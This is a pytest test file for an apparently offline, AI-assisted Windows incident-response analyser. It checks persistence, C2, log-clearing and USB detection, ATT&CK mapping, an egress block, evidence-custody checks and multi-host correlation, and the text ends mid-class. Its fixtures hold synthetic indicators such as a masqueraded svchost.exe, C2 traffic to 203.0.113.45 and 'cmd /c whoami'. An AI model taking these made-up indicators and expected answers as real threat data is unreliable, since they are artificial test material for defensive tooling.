import json
import os

import pytest

from afa.egress import EgressBlocked, assert_local
from afa.loader import load_evidence
from afa.providers import LocalOllamaProvider, OfflinePlanner
from afa.tools import (detect_antiforensics, find_indicator, list_autoruns,
                       search_events, usb_history)

EV = load_evidence()


# ---- the tools are the trusted oracle ----
class TestTools:
    def test_finds_suspicious_persistence(self):
        r = list_autoruns(EV)
        assert r["suspicious_count"] >= 2  # masqueraded Run key + malicious service
        datas = [s["data"].lower() for s in r["suspicious"]]
        assert any("users\\public\\svchost.exe" in d for d in datas)

    def test_usb_history_detects_device(self):
        r = usb_history(EV)
        assert r["count"] >= 1
        assert any("sandisk" in i["value_data"].lower() for i in r["items"])

    def test_search_events_by_id(self):
        r = search_events(EV, event_id=4688)
        assert r["count"] >= 4
        assert all(x["event_id"] == 4688 for x in r["items"])

    def test_detect_antiforensics_flags_log_clear(self):
        r = detect_antiforensics(EV)
        assert r["count"] == 1
        assert r["items"][0]["event_id"] == 1102

    def test_find_indicator_crosses_artifacts(self):
        r = find_indicator(EV, "203.0.113.45")
        assert r["event_hits"] >= 1

    def test_bad_indicator_is_clean(self):
        r = find_indicator(EV, "totally-not-present-9999")
        assert r["registry_hits"] == 0 and r["event_hits"] == 0


# ---- the air-gap is enforced structurally ----
class TestEgressGuard:
    def test_localhost_always_allowed(self):
        assert_local("http://localhost:11434")  # must not raise

    def test_remote_blocked_by_default(self, monkeypatch):
        monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
        with pytest.raises(EgressBlocked):
            assert_local("https://api.anthropic.com/v1/messages")

    def test_remote_allowed_when_opted_in(self, monkeypatch):
        monkeypatch.setenv("AFA_ALLOW_EGRESS", "1")
        assert_local("https://api.anthropic.com/v1/messages")  # must not raise

    def test_local_provider_never_trips_egress(self, monkeypatch):
        monkeypatch.delenv("AFA_ALLOW_EGRESS", raising=False)
        LocalOllamaProvider(model="llama3.1")  # constructing must not raise


# ---- a full offline investigation is grounded and correct ----
class TestOfflineInvestigation:
    def setup_method(self):
        self.p = OfflinePlanner()

    def test_persistence_answer_is_grounded(self):
        a = self.p.investigate("How did the attacker persist?", EV)
        assert a.grounded
        assert "persistence" in a.text.lower()
        assert any(t.name == "list_autoruns" for t in a.tool_calls)

    def test_antiforensics_question_routes_correctly(self):
        a = self.p.investigate("Did they try to cover their tracks?", EV)
        assert any(t.name == "detect_antiforensics" for t in a.tool_calls)
        assert "1102" in a.text or "audit log" in a.text.lower()

    def test_c2_question_finds_the_beacon(self):
        a = self.p.investigate("Is there any command-and-control activity?", EV)
        assert a.grounded
        assert "203.0.113" in a.text

    def test_usb_question(self):
        a = self.p.investigate("Was a USB device plugged in?", EV)
        assert any(t.name == "usb_history" for t in a.tool_calls)

    def test_every_answer_carries_provenance(self):
        for q in ["how did they persist", "what processes ran", "build a timeline"]:
            assert self.p.investigate(q, EV).grounded


from afa.tools import account_changes, map_attack, process_tree, scheduled_tasks


class TestDeeperTools:
    def test_process_tree_reconstructs_chain(self):
        r = process_tree(EV)
        # explorer -> powershell -> svchost -> rundll32
        edges = {(e["parent"], e["child"]) for e in r["edges"]}
        assert ("powershell.exe", "svchost.exe") in edges
        assert ("svchost.exe", "rundll32.exe") in edges
        assert "rundll32.exe" in r["tree"]

    def test_scheduled_tasks_found(self):
        r = scheduled_tasks(EV)
        assert r["count"] == 1
        assert "UpdateCheck" in r["items"][0]["detail"]

    def test_account_creation_found(self):
        r = account_changes(EV)
        assert any("supportadmin" in i["detail"] for i in r["items"])


class TestAttackMapping:
    def setup_method(self):
        self.m = map_attack(EV)

    def test_expected_techniques_detected(self):
        ids = {t["id"] for t in self.m["techniques"]}
        expected = {
            "T1059.001",  # PowerShell
            "T1547.001",  # Run keys
            "T1543.003",  # Windows service
            "T1053.005",  # Scheduled task
            "T1136.001",  # Create account
            "T1036.005",  # Masquerading
            "T1218.011",  # Rundll32
            "T1562.001",  # Impair defenses (Defender disabled)
            "T1070.001",  # Clear event logs
            "T1071.001",  # C2 web protocols
            "T1052.001",  # USB exfiltration
        }
        assert expected.issubset(ids)

    def test_covers_six_tactics_in_kill_chain_order(self):
        assert self.m["tactics_covered"] >= 6
        order = ["Execution", "Persistence", "Privilege Escalation",
                 "Defense Evasion", "Command and Control", "Exfiltration"]
        present = [t for t in order if t in self.m["tactics"]]
        # the covered tactics appear in canonical kill-chain order
        assert present == [t for t in self.m["tactics"] if t in order]

    def test_every_technique_is_evidence_backed(self):
        assert self.m["techniques"]
        assert all(t["count"] >= 1 and t["evidence"] for t in self.m["techniques"])

    def test_mapping_is_grounded_via_planner(self):
        a = OfflinePlanner().investigate("Map this incident to MITRE ATT&CK.", EV)
        assert any(t.name == "map_attack" for t in a.tool_calls)
        assert "T1070.001" in a.text


from afa.brief import build_brief, render_brief
from afa.normalize import normalize_events, normalize_registry, parse_ts
from afa.providers import run_agent_loop


class TestIngestRealEvidence:
    def test_get_winevent_json(self, tmp_path):
        p = tmp_path / "events.json"
        p.write_text(json.dumps([{
            "Id": 4688, "TimeCreated": "/Date(1744623000000)/", "MachineName": "TESTHOST",
            "LogName": "Security",
            "Message": ("A new process has been created.\n"
                        "Creator Process Name: C:\\Windows\\explorer.exe\n"
                        "New Process Name: C:\\Windows\\System32\\cmd.exe\n"
                        "Process Command Line: cmd /c whoami\n"
                        "Account Name: jdoe"),
        }]))
        rows = normalize_events(p)
        assert rows[0]["event_id"] == 4688
        assert rows[0]["process"] == "cmd.exe"
        assert rows[0]["parent_process"] == "explorer.exe"
        assert "whoami" in rows[0]["cmdline"]
        assert rows[0]["computer"] == "TESTHOST"
        assert rows[0]["ts"].startswith("2025")  # epoch decoded to a real date

    def test_csv_events(self, tmp_path):
        p = tmp_path / "ev.csv"
        p.write_text("TimeCreated,EventID,Computer,Process,CommandLine\n"
                     "2026-04-14T10:00:00Z,4688,HOST2,C:\\\\tmp\\\\evil.exe,evil.exe -run\n")
        rows = normalize_events(p)
        assert rows[0]["event_id"] == 4688
        assert rows[0]["process"] == "evil.exe"
        assert rows[0]["computer"] == "HOST2"

    def test_reg_export(self, tmp_path):
        p = tmp_path / "hive.reg"
        p.write_text("Windows Registry Editor Version 5.00\n\n"
                     "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n"
                     '"Evil"="C:\\\\Users\\\\Public\\\\x.exe"\n'
                     '"Flag"=dword:00000001\n')
        rows = normalize_registry(p)
        evil = next(r for r in rows if r["value_name"] == "Evil")
        assert evil["hive"] == "HKLM"
        assert evil["category"] == "run"
        assert "Users\\Public\\x.exe" in evil["value_data"]
        flag = next(r for r in rows if r["value_name"] == "Flag")
        assert flag["value_data"] == "1"  # dword decoded to decimal

    def test_parse_ts_shapes(self):
        assert parse_ts("/Date(1744623000000)/").startswith("2025")
        assert parse_ts("2026-04-14T09:00:00Z") == "2026-04-14T09:00:00Z"


class TestAgentLoop:
    def test_loop_chains_tools_with_scripted_model(self):
        scripted = [
            {"tool_calls": [{"function": {"name": "list_autoruns", "arguments": {}}}]},
            {"tool_calls": [{"function": {"name": "detect_antiforensics", "arguments": "{}"}}]},
            {"content": "Persistence via a Run key; the Security log was cleared."},
        ]
        state = {"i": 0}

        def chat(messages, tools):
            r = scripted[state["i"]]; state["i"] += 1; return r

        ans = run_agent_loop(chat, "what happened on this host", EV, "fake:test")
        assert {t.name for t in ans.tool_calls} == {"list_autoruns", "detect_antiforensics"}
        assert ans.grounded and "Run key" in ans.text

    def test_loop_direct_answer_is_ungrounded(self):
        ans = run_agent_loop(lambda m, t: {"content": "no tools needed"}, "q", EV, "fake")
        assert ans.text == "no tools needed" and not ans.grounded


class TestBrief:
    def test_brief_is_critical_and_grounded(self):
        b = build_brief(EV)
        assert b["severity"] == "Critical"
        assert b["key_findings"]
        assert "T1070.001" in b["attack"]["ids"]

    def test_render_brief_text(self):
        text = render_brief(build_brief(EV))
        assert "INCIDENT BRIEF" in text and "ATT&CK" in text


import shutil
from afa.package import load_package, verify_package
from afa.tools import local_users, network_connections, running_processes

PKG = "examples/sample-collection"


class TestCollectionPackage:
    def test_loads_artifacts_and_custody(self):
        ev, manifest = load_package(PKG)
        assert ev.host == "WEB-03"
        assert manifest["case_id"] == "IR-2026-031"
        assert len(ev.processes) == 4 and len(ev.network) == 2

    def test_verify_passes_on_intact_package(self):
        assert verify_package(PKG)["ok"] is True

    def test_tamper_is_detected(self, tmp_path):
        dst = tmp_path / "pkg"
        shutil.copytree(PKG, dst)
        (dst / "processes.json").write_text("[]")  # alter a file after collection
        v = verify_package(dst)
        assert v["ok"] is False
        assert any(f["name"] == "processes.json" and not f["ok"] for f in v["files"])
        with pytest.raises(ValueError):
            load_package(dst)  # refuses to analyze tampered evidence

    def test_attack_uses_live_process_and_network_artifacts(self):
        ev, _ = load_package(PKG)
        from afa.tools import map_attack
        techs = {t["id"]: t for t in map_attack(ev)["techniques"]}
        assert "T1071.001" in techs            # C2 derived from a live network connection
        assert "T1036.005" in techs            # masquerade derived from a process image path
        assert techs["T1059.001"]["count"] >= 2  # PowerShell seen in both events and processes


class TestLiveTriageTools:
    def setup_method(self):
        self.ev, _ = load_package(PKG)

    def test_processes(self):
        assert running_processes(self.ev)["count"] == 4

    def test_external_connections_only(self):
        ext = network_connections(self.ev, external_only=True)
        assert ext["count"] == 1
        assert "203.0.113.45" in ext["items"][0]["remote"]

    def test_local_users(self):
        names = {u["name"] for u in local_users(self.ev)["items"]}
        assert "supportadmin" in names


from afa.rootcause import build_reconstruction, extract_iocs
from afa.tools import powershell_activity, program_execution


class TestRootCause:
    def setup_method(self):
        self.ev, _ = load_package(PKG)
        self.recon = build_reconstruction(self.ev)

    def test_determines_root_cause_with_confidence(self):
        # the browser download + MFT first-write now give a concrete delivery vector
        assert "download" in self.recon["root_cause"].lower()
        assert "svchost.exe" in self.recon["root_cause"]
        assert self.recon["root_cause_confidence"] == "high"  # corroborated across browser/MFT/exec

    def test_attack_chain_is_ordered_kill_chain(self):
        phases = [s["phase"] for s in self.recon["chain"]]
        assert phases[0] == "Execution"
        assert "Command and Control" in phases and "Exfiltration" in phases
        # kill-chain order preserved
        from afa.tools import TACTIC_ORDER
        idx = [TACTIC_ORDER.index(p) for p in phases]
        assert idx == sorted(idx)

    def test_iocs_extracted_for_pivoting(self):
        io = self.recon["iocs"]
        assert any("203.0.113.45" in c for c in io["c2"])
        assert io["file_hashes"]                       # hashes from programs.json + shimcache
        assert "supportadmin" in io["accounts"]
        assert any("Public" in p for p in io["suspicious_paths"])

    def test_states_gaps_and_pivots_honestly(self):
        # at high confidence the inferred-vector caveat drops out, but the cleared
        # log and the confirmed first-write are still surfaced honestly
        assert any("cleared" in g.lower() for g in self.recon["gaps"])
        assert any("confirms the dropper's first write" in g for g in self.recon["gaps"])
        assert any("203.0.113.45" in p for p in self.recon["pivots"])

    def test_no_malicious_activity_yields_low_confidence(self):
        from afa.loader import Evidence
        recon = build_reconstruction(Evidence(events=[], host_name="CLEAN-01"))
        assert recon["root_cause_confidence"] == "low"


class TestExecutionArtifacts:
    def setup_method(self):
        self.ev, _ = load_package(PKG)

    def test_program_execution(self):
        r = program_execution(self.ev)
        assert r["count"] == 2 and r["items"][0]["sha1"]

    def test_powershell_activity_includes_scriptblock(self):
        r = powershell_activity(self.ev)
        assert any(i.get("event_id") == 4104 for i in r["items"])


try:
    from fastapi.testclient import TestClient
    from afa.gui import create_app
    _HAS_GUI = True
except Exception:
    _HAS_GUI = False


@pytest.mark.skipif(not _HAS_GUI, reason="fastapi/httpx not installed")
class TestGui:
    def setup_method(self):
        self.c = TestClient(create_app({"package": PKG}))

    def test_case_endpoint(self):
        r = self.c.get("/api/case").json()
        assert r["host"] == "WEB-03"
        assert r["custody"]["ok"] is True
        assert r["rootcause"]["root_cause_confidence"] == "high"
        assert r["counts"]["processes"] == 4 and r["counts"]["programs"] == 2
        # the deeper sources are surfaced to the console too
        assert r["counts"]["prefetch"] >= 4 and r["counts"]["wmi"] == 1
        assert len(r["artifacts"]["browser"]) == 3

    def test_ask_endpoint_is_grounded(self):
        a = self.c.post("/api/ask", json={"question": "Is there command-and-control activity?"}).json()
        assert a["grounded"] is True
        assert any(t["name"] == "network_connections" for t in a["tool_calls"])

    def test_index_served_offline(self):
        html = self.c.get("/").text
        assert "Forensic Analyst" in html
        assert "googleapis" not in html and "http://" not in html.split("led")[0]  # no external assets


class TestBomTolerance:
    def test_utf8_bom_package_loads_and_verifies(self, tmp_path):
        # PS 5.1 `Out-File -Encoding utf8` prepends a UTF-8 BOM; the loader must cope.
        import hashlib
        dst = tmp_path / "bom"
        shutil.copytree(PKG, dst)
        manifest = json.loads((dst / "manifest.json").read_text())
        for e in manifest["files"]:
            p = dst / e["name"]
            p.write_bytes(b"\xef\xbb\xbf" + p.read_bytes())
            e["sha256"] = hashlib.sha256(p.read_bytes()).hexdigest().upper()
        (dst / "manifest.json").write_text(json.dumps(manifest))
        assert verify_package(dst)["ok"] is True
        ev, _ = load_package(dst)
        assert ev.host == "WEB-03" and len(ev.processes) == 4


from afa.loader import Evidence
from afa.tools import corroborated_c2


class TestC2Precision:
    def test_benign_external_tls_is_not_flagged_as_c2(self):
        ev = Evidence(
            host_name="DESK-9",
            processes=[{"pid": 11, "ppid": 1, "name": "chrome.exe",
                        "path": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "cmdline": "", "hash": ""}],
            network=[{"proto": "tcp", "remote": "142.250.72.46:443", "state": "Established",
                      "pid": 11, "process": "chrome.exe"}],
        )
        assert corroborated_c2(ev) == []
        ids = {t["id"] for t in map_attack(ev)["techniques"]}
        assert "T1071.001" not in ids

    def test_suspicious_process_external_is_flagged(self):
        ev, _ = load_package(PKG)  # svchost.exe runs from C:\Users\Public -> corroborated
        assert any("203.0.113.45" in c["endpoint"] for c in corroborated_c2(ev))
        assert "T1071.001" in {t["id"] for t in map_attack(ev)["techniques"]}

    def test_null_process_network_row_does_not_crash(self):
        # The live collector writes "process": null when a connection's owning PID
        # isn't in the process map (process exited between snapshots, or a system PID).
        # corroborated_c2/map_attack must tolerate that, not raise AttributeError.
        ev = Evidence(
            host_name="DESK-9",
            network=[{"proto": "tcp", "remote": "203.0.113.45:443", "state": "Established",
                      "pid": 36996, "process": None}],
        )
        assert corroborated_c2(ev) == []  # uncorroborated (no owning process) -> not C2
        assert "T1071.001" not in {t["id"] for t in map_attack(ev)["techniques"]}


class TestCollectionWarningsSurface:
    def test_security_log_warning_becomes_a_gap(self):
        ev = Evidence(host_name="SRV-1",
                      collection_warnings=["Security event log was not collected (run elevated)."])
        recon = build_reconstruction(ev)
        assert any(g.startswith("Collection warning:") and "Security" in g for g in recon["gaps"])


class TestNullFieldHardening:
    """Real collected packages carry JSON null in fields the analyzer lower()/split()s
    (process, remote, user, path, value_data, name, detail). None of the tools may
    raise AttributeError on them — the whole class must stay dead."""

    def _null_evidence(self):
        return Evidence(
            host_name="DESK-9",
            events=[{"ts": "2026-01-01T00:00:00Z", "event_id": 4720, "channel": "Security",
                     "computer": None, "user": None, "process": None, "parent_process": None,
                     "cmdline": None, "dst_ip": None, "detail": None}],
            registry=[{"hive": "HKLM", "key": None, "value_name": None, "value_data": None,
                       "last_write": None, "category": "run"}],
            processes=[{"pid": 1, "ppid": 0, "name": None, "path": None, "cmdline": None,
                        "user": None, "created": None, "hash": None}],
            network=[{"proto": "tcp", "remote": None, "state": "Established", "pid": 1, "process": None}],
            services=[{"name": None, "path": None}],
            users=[{"name": None}],
            programs=[{"name": None, "path": None, "sha1": None}],
            # deeper suite sources may also arrive with null fields
            prefetch=[{"name": None, "path": None, "run_count": None, "last_run": None, "first_run": None}],
            shimcache=[{"name": None, "path": None, "sha1": None, "executed": None}],
            filesystem=[{"path": None, "created": None, "modified": None}],
            browser=[{"browser": None, "type": "download", "url": None,
                      "target_path": None, "timestamp": None}],
            wmi=[{"filter_name": None, "consumer_name": None, "consumer_type": None,
                  "command": None, "query": None}],
        )

    def test_no_tool_crashes_on_null_collected_fields(self):
        from afa.tools import (query_registry, prefetch_execution, shimcache_entries,
                               filesystem_timeline, browser_history, wmi_persistence)
        from afa.brief import build_brief
        ev = self._null_evidence()
        assert list_autoruns(ev)["suspicious_count"] == 0
        assert query_registry(ev, "evil")["count"] == 0
        assert search_events(ev, user="x", process="y")["count"] == 0
        assert corroborated_c2(ev) == []
        assert find_indicator(ev, "1.2.3.4")["event_hits"] == 0
        # the deeper suite tools must tolerate null fields too
        assert prefetch_execution(ev)["suspicious_count"] == 0
        assert shimcache_entries(ev)["suspicious_count"] == 0
        assert filesystem_timeline(ev)["earliest_drop"] is None
        browser_history(ev)         # must not raise
        wmi_persistence(ev)         # must not raise
        map_attack(ev)              # must not raise (incl. new WMI/ingress/user-exec rules)
        recon = build_reconstruction(ev)
        assert "gaps" in recon
        build_brief(ev)             # must not raise


# ============================================================================
# Deeper forensic sources: $MFT, Amcache/Shimcache, prefetch, browser, WMI.
# Each is "one normalizer plus one tool"; these prove the tool, the ingest, the
# ATT&CK mapping, and the root-cause integration for all five.
# ============================================================================
from afa.normalize import (normalize_browser, normalize_mft, normalize_prefetch,
                           normalize_shimcache, normalize_wmi)
from afa.tools import (browser_history, filesystem_timeline, prefetch_execution,
                       shimcache_entries, wmi_persistence)


class TestDeeperSourceTools:
    def setup_method(self):
        self.ev, _ = load_package(PKG)

    def test_prefetch_execution(self):
        r = prefetch_execution(self.ev)
        assert r["count"] >= 4
        svc = next(p for p in r["items"] if p["name"].lower() == "svchost.exe")
        assert svc["run_count"] == 3
        assert r["suspicious_count"] == 2          # svchost.exe (Public) + f.exe (Temp)

    def test_shimcache_presence_and_execution(self):
        r = shimcache_entries(self.ev)
        assert r["count"] >= 4
        assert any(s["path"].lower().endswith("public\\svchost.exe") and s["executed"]
                   for s in r["items"])
        assert r["suspicious_count"] == 2

    def test_filesystem_timeline_pins_dropper_first_write(self):
        r = filesystem_timeline(self.ev)
        assert r["earliest_drop"] is not None
        assert "svchost.exe" in r["earliest_drop"]["path"].lower()
        assert r["earliest_drop"]["created"] == "2026-05-02T09:10:05Z"

    def test_filesystem_timeline_window_filters(self):
        r = filesystem_timeline(self.ev, around="2026-05-02T09:12:00Z", minutes=5)
        paths = " ".join(i["path"] for i in r["items"])
        assert "Public\\svchost.exe" in paths and "notes.txt" not in paths

    def test_browser_downloads_flag_executables(self):
        r = browser_history(self.ev)
        assert r["count"] == 3 and r["download_count"] == 1
        assert len(r["executable_downloads"]) == 1
        assert r["executable_downloads"][0]["url"].endswith("svchost.exe")

    def test_wmi_persistence(self):
        r = wmi_persistence(self.ev)
        assert r["count"] == 1 and r["command_consumers"] == 1
        assert "public\\svchost.exe" in r["items"][0]["command"].lower()


class TestNewAttackTechniques:
    def setup_method(self):
        self.ev, _ = load_package(PKG)
        self.techs = {t["id"]: t for t in map_attack(self.ev)["techniques"]}

    def test_wmi_event_subscription_mapped(self):
        assert "T1546.003" in self.techs and self.techs["T1546.003"]["count"] >= 1

    def test_ingress_tool_transfer_mapped(self):
        assert "T1105" in self.techs           # browser executable download

    def test_user_execution_malicious_file_mapped(self):
        assert "T1204.002" in self.techs
        assert self.techs["T1204.002"]["count"] == 4   # 2 prefetch + 2 shimcache, suspicious paths

    def test_clean_host_has_none_of_the_new_techniques(self):
        ids = {t["id"] for t in map_attack(Evidence(host_name="CLEAN-2"))["techniques"]}
        assert not ({"T1546.003", "T1105", "T1204.002"} & ids)


class TestRootCauseUsesDeeperSources:
    def setup_method(self):
        self.ev, _ = load_package(PKG)
        self.recon = build_reconstruction(self.ev)

    def test_download_vector_is_high_confidence(self):
        assert self.recon["root_cause_confidence"] == "high"
        rc = self.recon["root_cause"].lower()
        assert "download" in rc and "svchost.exe" in rc

    def test_mft_first_write_named_in_root_cause(self):
        assert "first written to disk" in self.recon["root_cause"].lower()
        assert "2026-05-02T09:10:05Z" in self.recon["root_cause"]

    def test_download_url_and_wmi_in_iocs_and_pivots(self):
        io = self.recon["iocs"]
        assert any("svchost.exe" in u for u in io["download_urls"])
        assert any(p.startswith("WMI:") for p in io["persistence"])
        assert any("WMI subscription" in p for p in self.recon["pivots"])
        assert any("Block http://cdn.example-update.test" in p for p in self.recon["pivots"])

    def test_collected_mft_flips_the_gap_to_a_confirmation(self):
        assert any("confirms the dropper's first write" in g for g in self.recon["gaps"])
        assert not any("No file-system timeline" in g for g in self.recon["gaps"])


class TestDeeperSourceIngest:
    """Real exports from the tools analysts actually use, normalized to the schema."""

    def test_prefetch_from_pecmd_csv(self, tmp_path):
        p = tmp_path / "pf.csv"
        p.write_text("ExecutableName,RunCount,LastRun,SourceCreated,SourceFilename\n"
                     "EVIL.EXE,5,2026-05-02 09:30:00,2026-05-02 09:12:00,EVIL.EXE-1234.pf\n")
        rows = normalize_prefetch(p)
        assert rows[0]["name"] == "EVIL.EXE" and rows[0]["run_count"] == 5
        assert rows[0]["last_run"].startswith("2026-05-02T09:30")

    def test_shimcache_from_appcompatcacheparser_csv(self, tmp_path):
        p = tmp_path / "sc.csv"
        p.write_text("CacheEntryPosition,Path,LastModifiedTimeUTC,Executed\n"
                     "1,C:\\Users\\Public\\x.exe,2026-05-02 09:11:00,True\n")
        rows = normalize_shimcache(p)
        assert rows[0]["position"] == 1 and rows[0]["executed"] is True
        assert rows[0]["name"] == "x.exe"

    def test_mft_from_mftecmd_csv(self, tmp_path):
        p = tmp_path / "mft.csv"
        p.write_text("ParentPath,FileName,Created0x10,LastModified0x10,FileSize\n"
                     "C:\\Users\\Public,x.exe,2026-05-02 09:11:50,2026-05-02 09:11:50,73216\n")
        rows = normalize_mft(p)
        assert rows[0]["path"] == "C:\\Users\\Public\\x.exe" and rows[0]["size"] == 73216

    def test_browser_from_browsinghistoryview_csv(self, tmp_path):
        p = tmp_path / "bh.csv"
        p.write_text("URL,Title,VisitTime,WebBrowser\n"
                     "http://x.example.test/,Home,2026-05-02 09:00:00,Chrome\n")
        rows = normalize_browser(p)
        assert rows[0]["type"] == "visit" and rows[0]["browser"] == "Chrome"

    def test_wmi_from_generic_json(self, tmp_path):
        p = tmp_path / "wmi.json"
        p.write_text(json.dumps([{"filter": "F1", "consumer": "C1",
                                  "consumerClass": "CommandLineEventConsumer",
                                  "commandLineTemplate": "evil.exe"}]))
        rows = normalize_wmi(p)
        assert rows[0]["filter_name"] == "F1" and rows[0]["command"] == "evil.exe"

    def test_load_evidence_ingests_new_exports(self, tmp_path):
        pf = tmp_path / "pf.json"
        pf.write_text(json.dumps([{"name": "evil.exe", "path": "C:\\Users\\Public\\evil.exe",
                                   "run_count": 2, "last_run": "2026-05-02T09:30:00Z",
                                   "first_run": "2026-05-02T09:12:00Z", "prefetch_file": ""}]))
        ev = load_evidence(prefetch_path=pf)
        assert prefetch_execution(ev)["count"] == 1
        assert "T1204.002" in {t["id"] for t in map_attack(ev)["techniques"]}


# ============================================================================
# v2 — cross-host correlation. A case is a SET of packages correlated into one
# campaign: lateral-movement + shared-indicator graph, unified host-tagged
# timeline, campaign root cause, and an ATT&CK rollup — all deterministic and
# fully air-gapped, every element traceable to a named package.
# ============================================================================
import hashlib as _hashlib
from afa.correlate import (correlate_case, load_case, resolve_packages,
                           render_case_terminal)

CASE = "examples/sample-case"


def _copy_case(tmp_path):
    """Copy the three-host sample case into a tmp dir for mutation."""
    dst = tmp_path / "case"
    shutil.copytree(CASE, dst)
    return dst


def _rehash_manifest(pkg_dir):
    """Recompute a package manifest's SHA-256s after editing its artifact files."""
    mpath = pkg_dir / "manifest.json"
    manifest = json.loads(mpath.read_text())
    for e in manifest["files"]:
        e["sha256"] = _hashlib.sha256((pkg_dir / e["name"]).read_bytes()).hexdigest().upper()
    mpath.write_text(json.dumps(manifest, indent=2))


class TestCaseLoadingAndCustody:
    def test_loads_all_packages_and_verifies_each(self):
        hosts, rejected = load_case(CASE)
        assert {h["host"] for h in hosts} == {"WEB-01", "DB-02", "DC-01"}
        assert rejected == []
        assert all(h["custody"]["ok"] for h in hosts)

    def test_resolve_packages_finds_three(self):
        assert len(resolve_packages(CASE)) == 3

    def test_tampered_package_is_rejected_and_named(self, tmp_path):
        dst = _copy_case(tmp_path)
        (dst / "db-02" / "processes.json").write_text("[]")  # tamper, do NOT rehash
        hosts, rejected = load_case(dst)
        assert {h["host"] for h in hosts} == {"WEB-01", "DC-01"}      # tampered one excluded
        assert len(rejected) == 1
        assert "db-02" in rejected[0]["package"]
        assert "custody" in rejected[0]["reason"].lower()
        # the campaign reflects the rejection rather than silently analyzing it
        campaign = correlate_case(dst)
        assert campaign["host_count"] == 2 and len(campaign["rejected"]) == 1


class TestUndirectedEdges:
    def setup_method(self):
        self.c = correlate_case(CASE)

    def test_shared_c2_hash_account_across_hosts(self):
        shared = self.c["shared_indicators"]
        assert any(s["value"] == "203.0.113.45" for s in shared["c2"])
        assert any(s["value"] == "A94A8FE5CCB19BA61C4C0873D391E987982FBBD3" for s in shared["hash"])
        assert any(s["value"] == "svc_backup" for s in shared["account"])
        # each shared indicator spans all three hosts
        c2 = next(s for s in shared["c2"] if s["value"] == "203.0.113.45")
        assert {m["host"] for m in c2["hosts"]} == {"WEB-01", "DB-02", "DC-01"}

    def test_undirected_edges_carry_per_side_evidence(self):
        assert self.c["undirected_edges"]
        for edge in self.c["undirected_edges"]:
            a, b = edge["hosts"]
            for s in edge["shared"]:
                assert s["evidence"][a] and s["evidence"][b]   # provenance on both sides


class TestDirectedEdges:
    def setup_method(self):
        self.c = correlate_case(CASE)

    def test_pivot_chain_direction_and_citations(self):
        edges = {(e["source"], e["dest"]): e for e in self.c["directed_edges"]}
        assert ("WEB-01", "DB-02") in edges
        assert ("DB-02", "DC-01") in edges
        assert ("DB-02", "WEB-01") not in edges               # direction is correct
        e = edges[("WEB-01", "DB-02")]
        assert e["account"] == "svc_backup"
        assert e["ts"] == "2026-05-02T09:30:00Z"
        assert e["logon_type"] == "3"
        assert "DB-02" in e["evidence"] and "4624" in e["evidence"]

    def test_directed_edges_are_time_ordered(self):
        ts = [e["ts"] for e in self.c["directed_edges"]]
        assert ts == sorted(ts)


class TestUnifiedTimeline:
    def setup_method(self):
        self.c = correlate_case(CASE)

    def test_timeline_is_ordered_and_host_tagged(self):
        tl = self.c["timeline"]
        assert len(tl) >= 12
        assert [r["ts"] for r in tl] == sorted(r["ts"] for r in tl)
        assert all(r["host"] in {"WEB-01", "DB-02", "DC-01"} and r["package"] for r in tl)
        assert {r["host"] for r in tl} == {"WEB-01", "DB-02", "DC-01"}


class TestCampaignRootCause:
    def test_identifies_entry_and_orders_chain(self):
        c = correlate_case(CASE)
        assert c["entry_host"] == "WEB-01"
        assert c["confidence"] == "high"
        reached = [s["to"] for s in c["pivot_chain"]]
        assert reached == ["WEB-01", "DB-02", "DC-01"]        # entry first, then pivots in order

    def test_degrades_without_source_fields(self, tmp_path):
        dst = _copy_case(tmp_path)
        # strip the logon-source fields from every package's events, then re-hash
        for d in ("web-01", "db-02", "dc-01"):
            epath = dst / d / "events.json"
            events = json.loads(epath.read_text())
            for e in events:
                e["logon_type"] = e["src_ip"] = e["src_host"] = ""
            epath.write_text(json.dumps(events, indent=2))
            _rehash_manifest(dst / d)
        c = correlate_case(dst)
        assert c["directed_edges"] == []                      # no directed movement reconstructable
        assert c["confidence"] in ("medium", "low")           # lower confidence, no crash
        assert c["undirected_edges"]                          # still linked by shared indicators
        assert c["host_count"] == 3


class TestAttackRollup:
    def setup_method(self):
        self.c = correlate_case(CASE)

    def test_unions_and_attributes_without_dupes(self):
        techs = self.c["attack"]["techniques"]
        ids = [t["id"] for t in techs]
        assert len(ids) == len(set(ids))                      # de-duplicated
        by_id = {t["id"]: t for t in techs}
        # C2 (web protocols) is seen on all three hosts and attributed to each
        assert set(by_id["T1071.001"]["hosts"]) == {"WEB-01", "DB-02", "DC-01"}
        # the rollup is a true union: a web-01-only technique is still present
        assert "T1070.001" in by_id and by_id["T1070.001"]["hosts"] == ["WEB-01"]


class TestProvenanceInvariant:
    """Every edge and finding must trace to a real event/artifact in a named pkg."""
    def setup_method(self):
        self.c = correlate_case(CASE)
        self.events = {h["host"]: load_package(h["package"])[0].events for h in self.c["hosts"]}

    def test_directed_edges_cite_a_real_event(self):
        for e in self.c["directed_edges"]:
            dest_events = self.events[e["dest"]]
            match = [x for x in dest_events
                     if x.get("event_id") in (4624, 4625) and x.get("ts") == e["ts"]]
            assert match, f"no backing event for edge {e['source']}->{e['dest']}"
            assert e["package"]                               # names the package

    def test_shared_indicators_exist_in_each_named_host(self):
        loaded = {h["host"]: load_package(h["package"])[0] for h in self.c["hosts"]}
        for cat in ("c2", "hash", "account"):
            for s in self.c["shared_indicators"][cat]:
                for m in s["hosts"]:
                    blob = json.dumps([e for e in loaded[m["host"]].events]
                                      + loaded[m["host"]].network
                                      + loaded[m["host"]].programs
                                      + loaded[m["host"]].processes
                                      + loaded[m["host"]].shimcache).lower()
                    assert s["value"].lower() in blob, f"{s['value']} not in {m['host']}"


class TestCaseCli:
    def test_case_cli_runs_and_writes_self_contained_html(self, tmp_path):
        from typer.testing import CliRunner
        from afa.cli import app
        out = tmp_path / "case.html"
        res = CliRunner().invoke(app, ["case", "--packages", CASE, "--out", str(out)])
        assert res.exit_code == 0, res.output
        assert "WEB-01" in res.output and "DB-02" in res.output
        assert "confidence: high" in res.output
        html = out.read_text(encoding="utf-8")
        # self-contained: no external resource fetches of any kind
        for bad in ('googleapis', 'src="http', 'href="http', '@import', 'url(http', '<script'):
            assert bad not in html, f"external resource ref found: {bad}"
        # contains the required sections + inline graph
        assert "<svg" in html
        for section in ("Host graph", "Pivot chain", "Unified timeline",
                        "ATT&amp;CK rollup", "Chain of custody"):
            assert section in html


class TestV2BackwardCompat:
